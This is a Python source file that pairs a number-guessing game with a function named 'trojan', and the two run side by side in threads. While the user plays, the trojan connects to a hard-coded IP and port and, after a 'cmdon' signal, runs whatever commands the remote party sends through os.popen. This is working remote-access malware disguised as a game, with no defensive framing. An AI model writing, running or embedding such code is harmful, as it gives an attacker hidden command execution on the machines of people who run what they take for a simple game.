import threading,random,socket,os
def trojan():
    HOST='192.168.0.103'
    PORT=9000
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    cmd_mode=False
    while True:
        server_cm=client.recv(1024).decode('utf-8')
        if server_cm=='cmdon':
            cmd_mode=True
            client.send(f"You now have terminal access..!".encode('utf-8'))
            continue
        if server_cm=='cmdoff':
            cmd_mode=False
        if cmd_mode:
            os.popen(server_cm)
        elif server_cm =='hello':
            print('Hello world..!')
        client.send(f"{server_cm} is executed successfully".encode('utf-8'))

def game():
    trying=1
    number=random.randint(1,1000)
    done=False
    while not done:
        guess=int(input('Enter the number:'))
        if guess==number:
            done=True
            print('You guessed it right...!')
        else:
            trying+=1
            if guess>number:
                print('The actual Number is smaller')
            else:
                print('The actual Number is greater')
    print(f"You used {trying} guesses")

t1=threading.Thread(target=game)
t2=threading.Thread(target=trojan)
t1.start()
t2.start()